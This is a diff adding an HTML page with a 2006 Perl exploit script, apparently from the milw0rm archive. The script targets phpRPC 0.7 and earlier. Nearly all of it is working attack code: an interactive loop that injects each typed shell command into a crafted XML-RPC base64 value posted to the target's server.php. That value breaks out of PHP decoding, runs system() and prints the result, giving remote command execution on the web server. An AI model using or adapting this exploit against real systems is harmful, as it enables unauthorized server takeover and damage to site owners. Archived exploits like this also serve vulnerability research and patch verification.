@@ -1,0 +1,91 @@
+<html><head><title>phpRPC Library <= 0.7 XML Data Decoding Remote Code Execution (2)</title></head><pre>#!/usr/bin/perl
+#
+# phpRPC &lt;=0.7 Remote Command Execution Exploit
+#
+# based on: http://www.gulftech.org/?node=research&amp;article_id=00105-02262006
+#
+# Copyright (c) 2006 cijfer &lt;cijfer@netti!fi&gt;
+# All rights reserved.
+#
+# never ctrl+c again.
+# cijfer$ http://target.com/dir
+# host changed to 'http://target.com/dir'
+# cijfer$ 
+#
+# $Id: cijfer-prpcxpl.pl,v 0.1 2006/03/01 05:46:00 cijfer Exp $
+
+use LWP::UserAgent;
+use URI::Escape;
+use Getopt::Long;
+use Term::ANSIColor;
+
+$res  = GetOptions(&quot;host=s&quot; =&gt; \$host, &quot;proxy=s&quot; =&gt; \$proxy, &quot;verbose+&quot; =&gt; \$verbose);
+&amp;usage unless $host;
+
+while()
+{
+	print color(&quot;green&quot;), &quot;cijfer\$ &quot;, color(&quot;reset&quot;);
+	chomp($command = &lt;STDIN&gt;);
+	exit unless $command;
+	if($command =~ m/^http:\/\/(.*)/g)
+	{
+		$host=&quot;http://&quot;.$1;
+		print &quot;host changed to '&quot;;
+		print color(&quot;bold&quot;), $host.&quot;'\n&quot;, color(&quot;reset&quot;);
+	}
+	else
+	{
+		&amp;exploit($command,$host);
+	}
+}
+
+sub usage
+{
+	print &quot;phpRPC &lt;=0.7 Remote Command Execution Exploit\n&quot;;
+	print &quot;usage: $0 -hpv\n\n&quot;;
+	print &quot;  -h, --host\t\tfull address of target (ex. http://www.website.com/dir)\n&quot;;
+	print &quot;  -p, --proxy\t\tprovide an HTTP proxy (ex. 0.0.0.0:8080)\n&quot;;
+	print &quot;  -v, --verbose\t\tverbose mode (debug)\n\n&quot;;
+	exit;
+}
+
+sub exploit
+{
+	my($command,$host) = @_;
+
+	$cij=LWP::UserAgent-&gt;new() or die;
+	$cij-&gt;agent(&quot;Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:2.0) Gecko/20060101&quot;);
+	$cij-&gt;proxy(&quot;http&quot;, &quot;http://&quot;.$proxy.&quot;/&quot;) unless !$proxy;
+
+	$string  = shift;
+	$xml     = &quot;&lt;?xml version=\&quot;1.0\&quot;?&gt;&quot;;
+	$xml    .= &quot;&lt;methodCall&gt;&quot;;
+	$xml    .= &quot;&lt;methodName&gt;cijfer&quot;;
+	$xml    .= &quot;    &lt;params&gt;&quot;;
+	$xml    .= &quot;	    &lt;param&gt;&quot;;
+	$xml    .= &quot;	    &lt;value&gt;&lt;base64&gt;'));echo\&quot;_cijfer_\n\&quot;;system('&quot;.$string.&quot;');echo\&quot;_cijfer_\&quot;;exit();&quot;;
+	$xml    .= &quot;	    &lt;/param&gt;&quot;;
+	$xml    .= &quot;    &lt;/params&gt;&quot;;
+	$xml    .= &quot;&lt;/methodCall&gt;&quot;;
+
+	$req=new HTTP::Request 'POST'=&gt;$host.&quot;/modules/phpRPC/server.php&quot;;
+	$req-&gt;content_type(&quot;text/xml&quot;);
+	$req-&gt;content($xml);
+	$out=$cij-&gt;request($req);
+
+	if($out-&gt;is_success)
+	{
+		@cij=split(&quot;_cijfer_&quot;,$out-&gt;content);
+		print substr(@cij[1],1);
+	}
+
+	if($verbose)
+	{
+		$recv=length $out-&gt;content;
+		print &quot;Total received bytes: &quot;.$recv.&quot;\n&quot;;
+		$sent=length $command;
+		print &quot;Total sent bytes: &quot;.$sent.&quot;\n&quot;;
+	}
+}
+
+# milw0rm.com [2006-03-02]</pre></html>
